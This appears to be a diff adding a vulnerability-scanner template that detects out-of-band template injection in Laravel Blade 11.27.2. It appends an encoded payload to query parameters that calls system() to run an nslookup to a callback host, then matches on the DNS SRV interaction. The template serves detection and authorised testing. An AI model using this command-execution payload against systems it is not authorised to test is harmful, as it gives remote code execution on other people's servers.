@@ -1,0 +1,40 @@
+id: blade-oob
+
+info:
+  name: Laravel Blade 11.27.2 - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://laravel.com/docs/11.x/blade
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%7B%7Bsystem%28%27nslookup%20-type=SRV%20{{interactsh-url}}%27%29%7D%7D%0A'
+
+    skip-variables-check: true
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022100868bcf981a142711056d4dbaec3a2f43c6224f3aaf50f381ee22f27186cdb5170220052c142359f42e336e933dfc7b81b6e8292c29870dc36ad5c0ef84a726afbe58:922c64590222798bb761d5b6d8e72950
